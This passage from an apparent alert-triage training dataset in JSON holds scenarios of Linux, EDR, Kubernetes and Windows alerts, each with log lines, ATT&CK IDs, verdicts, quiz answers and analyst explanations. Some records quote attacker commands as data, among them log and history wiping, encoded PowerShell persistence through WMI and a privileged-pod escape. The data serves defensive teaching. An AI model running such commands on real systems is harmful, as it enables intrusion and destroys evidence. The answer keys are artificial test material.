3311)"],"v":1,"x":"T1098.004","c":"ssh-authkeys","k":[2],"diff":2,"say":"A new root SSH key with a junk comment was appended, written from a shell tied to a reverse-shell process.","tell":"New root SSH key with a junk comment, added from a reverse-shell bash. Now they do not need the exploit anymore. Remove the key and rotate everything.","pair":"z62"},{"id":"l05","d":"linux","src":"Linux \u00b7 auth.log","t":"SSH brute force","h":"sftp-ext-01 (internet-facing)","l":["Failed password for root from 61.x.x.x: 12,000 in 24h","successful logins: 0","PasswordAuthentication: no (keys only)"],"v":0,"x":"T1110.001","c":"internet-bg-noise","k":[1,2],"diff":2,"trap":"scary","say":"Twelve thousand failed root SSH attempts in a day against an internet-facing server, zero successes, keys only.","tell":"Internet-facing SSH gets hammered 24/7. Zero successes and key-only auth = noise. Escalate on a success, not on attempts."},{"id":"l06","d":"linux","src":"Linux \u00b7 Sysmon for Linux","t":"High CPU unknown binary","h":"k8s-node-07 \u00b7 uid 1001","l":["process: /tmp/.X11-unix/kdevtmpfsi","CPU: 390% \u00b7 conn: pool.supportxmr.com:3333"],"v":1,"x":"T1496","c":"cryptomining","k":[1],"diff":1,"say":"A binary hidden in a temp directory is pegging the processor and talking to a Monero mining pool.","q":{"kind":"contain","ask":"First action?","o":["Just kill the process","Kill the miner and find the exposed entry point","Reboot the node"],"a":1,"why":"Without closing the entry, it returns on reboot."},"tell":"Binary hiding in /tmp/.X11-unix, pegging CPU, talking to a Monero pool. Kinsing-style cryptojacking. Usually through an exposed container or Docker API."},{"id":"l07","d":"linux","src":"Linux \u00b7 auditd","t":"Sudo to root shell","h":"app-prod-02 \u00b7 deploy","l":["cmd: sudo systemctl restart nginx","sudoers: deploy ALL=(root) NOPASSWD: /bin/systemctl restart nginx","during: CI deploy job #4471"],"v":0,"x":"T1548.003","c":"sudo-context","k":[1],"diff":2,"trap":"scary","say":"A deploy account used a scoped password-free sudo rule to restart only the web server, during a deploy job.","tell":"Scoped NOPASSWD sudo for exactly one command, during a deploy. That is least privilege done right."},{"id":"l08","d":"linux","src":"Linux \u00b7 auditd","t":"Log tampering","h":"web-prod-19 \u00b7 root","l":["cmd: echo > /var/log/auth.log; history -c; unset HISTFILE","parent: bash (session from 203.0.113.9)"],"v":1,"x":"T1685.006","c":"log-clearing","k":[0],"diff":2,"say":"A session cleared the authentication log and shell history, coming from the same address as a reverse shell.","tell":"Wiping auth.log and shell history from a session out of the reverse shell IP. They are cleaning up on the way out. Grab memory and disk now."},{"id":"l09","d":"linux","src":"Kubernetes \u00b7 audit log","t":"Privileged pod created","h":"cluster: prod-aks \u00b7 ns: default","l":["pod: debug-x \u00b7 image: alpine","securityContext: privileged: true \u00b7 hostPID: true \u00b7 hostPath: /","user: system:serviceaccount:default:default"],"v":1,"x":"T1611","c":"container-escape","k":[1],"diff":2,"say":"A privileged pod was created with host process namespace and the whole host filesystem mounted, from the default service account.","q":{"kind":"contain","ask":"First action?","o":["Delete the pod only","Restart the cluster","Delete the pod and lock down the default service account"],"a":2,"why":"Fix the RBAC that let a default SA go privileged."},"tell":"Privileged pod with hostPID and the whole host filesystem mounted, from the default service account. That is a container escape in YAML form."},{"id":"x01","d":"edr","src":"Defender Antivirus \u00b7 1116","t":"Hacktool detected","h":"WS-IT-0198 \u00b7 ssato","l":["threat: HackTool:Win64/Mimikatz","path: C:\\Users\\admin_kp\\Downloads\\mimi\\x64\\mimikatz.exe","action: quarantined"],"v":1,"x":"T1003.001","c":"mimikatz-present","k":[1],"diff":1,"say":"Antivirus quarantined a Mimikatz hack tool found in the downloads folder of an IT admin account.","tell":"Quarantined does not mean closed. Why does an IT admin have Mimikatz in Downloads? Either an unsanctioned \"test\" or a compromised admin. Find out."},{"id":"x02","d":"edr","src":"Defender Antivirus \u00b7 1116","t":"Potentially unwanted app","h":"WS-MKT-0377 \u00b7 trose","l":["threat: PUA:Win32/Wajam","path: ...\\AppData\\Local\\Temp\\free_pdf_converter_setup.exe","action: blocked \u00b7 no execution"],"v":0,"x":"T1204.002","c":"pua-adware","k":[2],"diff":1,"trap":"scary","say":"Antivirus blocked a potentially unwanted adware bundle inside a free PDF converter before it could run.","tell":"Adware bundled in a free PDF converter, blocked before execution. Close it and send the user a \"please stop\" link. PUA is hygiene, not an incident."},{"id":"x03","d":"edr","src":"Defender for Endpoint \u00b7 Alert","t":"Tampering with sensor","h":"SRV-APP-44 \u00b7 SYSTEM","l":["action: attempt to stop Sense service","process: C:\\Windows\\Temp\\tdsskiller.exe (renamed: av.exe)","driver loaded: vulnerable signed driver (BYOVD)"],"v":1,"x":"T1687","c":"disable-security-control","k":[2],"diff":2,"say":"An attempt to stop the sensor service came from a renamed tool in temp, after a vulnerable signed driver loaded.","q":{"kind":"contain","ask":"First action?","o":["Isolate the host before the driver finishes killing EDR","Update the driver","Restart the Sense service"],"a":0,"why":"BYOVD precedes detonation; isolate immediately."},"tell":"A vulnerable signed driver loaded to kill your EDR. Bring Your Own Vulnerable Driver is how ransomware crews go invisible right before detonation.","pair":"e12"},{"id":"x04","d":"edr","src":"Defender for Endpoint \u00b7 Alert","t":"Suspicious PowerShell download","h":"WS-ENG-0144 \u00b7 bwalsh","l":["cmd: iwr https://community.chocolatey.org/install.ps1 -UseBasicParsing | iex","user role: developer \u00b7 device: dev-tools policy","followed by: choco install nodejs"],"v":0,"x":"T1059.001","c":"iwr-iex-context","k":[0],"diff":2,"trap":"scary","say":"A developer piped the official Chocolatey install script into execution, then installed Node, on a dev-tools machine.","tell":"iwr | iex looks exactly like a download cradle, but it is the official Chocolatey installer on a dev box, followed by installing Node. The domain is the difference."},{"id":"z01","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"MSBuild.exe execution","h":"WS-ENG-0051 \u00b7 tkline","l":["parent: devenv.exe","cmd: msbuild.exe C:\\Users\\tkline\\src\\payments-api\\build.proj /t:Build","signer: Microsoft \u00b7 user role: developer"],"v":0,"x":"T1127.001","c":"lolbin-dev-context","diff":2,"k":[0],"say":"MSBuild started by Visual Studio on a developer workstation, building a project file from the user source folder.","tell":"MSBuild is a LOLBin, but parented by Visual Studio building a repo project under a dev account is just Tuesday. Context is the control, not the binary name.","pair":"z02"},{"id":"z02","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"MSBuild.exe execution","h":"WS-FIN-0233 \u00b7 rowens","l":["parent: OUTLOOK.EXE","cmd: msbuild.exe C:\\Users\\rowens\\AppData\\Local\\Temp\\update.xml","note: xml contains inline <Task> C# with VirtualAlloc"],"v":1,"x":"T1127.001","c":"lolbin-dev-context","diff":2,"k":[0],"say":"MSBuild started by Outlook on a finance workstation, running an XML from Temp with an inline C sharp task calling VirtualAlloc.","q":{"kind":"pivot","ask":"First pivot?","o":["Pull the email and attachment that dropped update.xml","Block msbuild.exe on all endpoints","Reset rowens password and close"],"a":0,"why":"Find the delivery email first: it scopes other recipients and the payload."},"tell":"Same MSBuild, but Outlook is the parent and the project is an inline C# task in Temp. Finance users do not compile. That is code exec hiding behind a trusted compiler.","pair":"z01"},{"id":"z03","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"InstallUtil invoked with uninstall flag","h":"WS-IT-0004 \u00b7 SYSTEM","l":["parent: ccmexec.exe","cmd: installutil.exe /u /logfile= C:\\Windows\\CCM\\Cache\\app.dll","signer: Microsoft"],"v":0,"x":"T1218.004","c":"installutil-exec","diff":2,"k":[0],"say":"InstallUtil with the uninstall flag, launched by the SCCM client, against a DLL in the SCCM cache folder.","q":{"kind":"tune","ask":"Best tuning?","o":["Exclude installutil.exe /u everywhere","Exclude host WS-IT-0004","Exclude parent ccmexec.exe + path C:\\Windows\\CCM\\Cache\\"],"a":2,"why":"Parent + path scope keeps the /U trick detectable from any other parent."},"tell":"InstallUtil /u out of the SCCM cache, parented by CcmExec, is a normal app (un)install. Check the parent and the path before you reach for the pager.","pair":"z04"},{"id":"z04","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"InstallUtil invoked with uninstall flag","h":"WS-SALES-0612 \u00b7 bmorris","l":["parent: wscript.exe","cmd: installutil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\svc.dll","signer: unsigned"],"v":1,"x":"T1218.004","c":"installutil-exec","diff":2,"k":[0],"say":"InstallUtil with the uninstall flag, launched by Windows Script Host, against an unsigned DLL in the Public user folder.","tell":"The /U uninstall trick runs the Uninstall method so your code fires without a real install. Wscript parent + unsigned DLL in Public = proxy execution, escalate.","pair":"z03"},{"id":"z05","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Odbcconf registered a DLL","h":"WS-DBA-0071 \u00b7 SYSTEM","l":["parent: msiexec.exe","cmd: odbcconf.exe /a {regsvr C:\\Program Files\\Common Files\\Vendor\\odbcdriver.dll}","signer: valid (vendor)"],"v":0,"x":"T1218.008","c":"odbcconf-regsvr","diff":3,"trap":"scary","k":[2],"say":"Odbcconf regsvr loads a DLL from Program Files, launched by the Windows installer. The DLL carries a valid vendor signature.","tell":"odbcconf regsvr looks like a LOLBin because it is one, but a signed ODBC driver registered by an MSI installer is exactly its day job. Signer + install path clear it."},{"id":"z06","d":"endpoint","src":"Sysmon \u00b7 Event ID 1","t":"Cmstp processed an INF","h":"WS-REMOTE-0318 \u00b7 deploy","l":["parent: msiexec.exe","cmd: cmstp.exe /ni /s C:\\Program Files\\CiscoVPN\\profiles\\corp.inf","inf: standard connection-manager profile, no RunPreSetupCommandsSection"],"v":0,"x":"T1218.003","c":"cmstp-inf","diff":3,"trap":"scary","k":[2],"say":"Cmstp silently installs an INF from the VPN program folder. The INF is a plain connection profile with no command sections.","tell":"Cmstp is abused to run commands from a crafted INF, so read the INF. A plain connection-manager profile with no command sections is just a VPN install. The payload lives in the INF, not the process name."},{"id":"z07","d":"endpoint","src":"Sysmon \u00b7 Event ID 21","t":"WMI permanent event subscription created","h":"SRV-APP-07 \u00b7 SYSTEM","l":["filter: EventFilter \"Updater\" \u00b7 WITHIN 60 __InstanceModificationEvent Win32_LocalTime","consumer: CommandLineEventConsumer \u2192 powershell -e <b64>","binding: created by powershell.exe"],"v":1,"x":"T1546.003","c":"wmi-event-sub","diff":3,"k":[1],"say":"WMI subscription named Updater. Clock-based filter every sixty seconds, bound to a command line consumer that runs encoded PowerShell.","q":{"kind":"contain","ask":"Best containment step?","o":["Delete the event consumer and close","Isolate SRV-APP-07, then remove filter, consumer and binding","Reboot SRV-APP-07 to clear it"],"a":1,"why":"Isolate first; reboots do not clear WMI repo persistence and deleting alone loses scope."},"tell":"A CommandLineEventConsumer tied to a clock-based filter is fileless persistence that survives reboots and lives in the WMI repo. Nobody legit schedules PowerShell this way.","pair":"z08"},{"id":"z08","d":"endpoint","src":"Sysmon \u00b7 Event ID 21","t":"WMI permanent event subscription created","h":"SRV-APP-09 \u00b7 SYSTEM","l":["filter: EventFilter \"SCM Event Log Filter\"","consumer: NTEventLogEventConsumer \"SCM Event Log Consumer\"","binding: built-in Windows subscription \u00b7 identical on every server in the image"],"v":0,"x":"T1546.003","c":"wmi-event-sub","diff":3,"trap":"scary","k":[1],"say":"WMI subscription named SCM Event Log. The consumer only writes to the event log, and it is identical on every server image.","q":{"kin
